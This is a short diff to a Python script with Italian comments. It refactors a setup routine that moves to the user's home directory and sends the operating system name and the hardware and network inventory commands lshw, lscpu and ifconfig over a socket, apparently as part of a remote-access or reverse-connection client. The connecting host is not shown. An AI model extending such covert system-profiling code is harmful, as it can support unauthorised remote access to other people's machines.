@@ -4,6 +4,7 @@ import os
 from pathlib import Path
 import traceback
 import getpass
+import platform
 
 
 def connect():
@@ -31,7 +32,7 @@ def setup_windows(connectionSocket):
 
 
 
-def setup_Linux(connectionSocket):
+def setup_linux(connectionSocket):
     connectionSocket.send("lshw".encode(encoding='latin-1'))
     connectionSocket.send("lscpu".encode(encoding='latin-1'))
     connectionSocket.send("ifconfig".encode(encoding='latin-1'))
@@ -43,20 +44,38 @@ def setup_Linux(connectionSocket):
 
 def setup(connectionSocket):
 
-    sys = os.uname() #sistema operativo e tipo di macchina
-    os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
-                        #dell'utente che apre il file)
+    #-----------
 
-    connectionSocket.send(sys.__str__().encode(encoding='latin-1'))
-    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
+    # sys = os.uname() #sistema operativo e tipo di macchina
+    # os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
+    #                     #dell'utente che apre il file)
 
-    if sys.sysname == "Windows":
-       setup_windows(connectionSocket)
+    # connectionSocket.send(sys.__str__().encode(encoding='latin-1'))
+    # connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
 
-    if sys.sysname == 'Linux': #aggiungere Mac
-        setup_Linux(connectionSocket)
+    # if sys.sysname == "Windows":
+    #    setup_windows(connectionSocket)
 
+    # if sys.sysname == 'Linux': #aggiungere Mac
+    #     setup_Linux(connectionSocket)
+
+    # connectionSocket.send('esc'.encode(encoding='latin-1'))
+
+    #-------------------------
+
+    system = platform.system()###
+    os.chdir(Path.home())###
+
+    connectionSocket.send(system.encode(encoding='latin-1'))###
+
+    if system == 'Windows':###
+        setup_windows(connectionSocket)###
+    elif system == 'Linux':###
+        setup_linux(connectionSocket)###
+    ##da aggiungere macos###
+    
     connectionSocket.send('esc'.encode(encoding='latin-1'))
+    
 
     
 
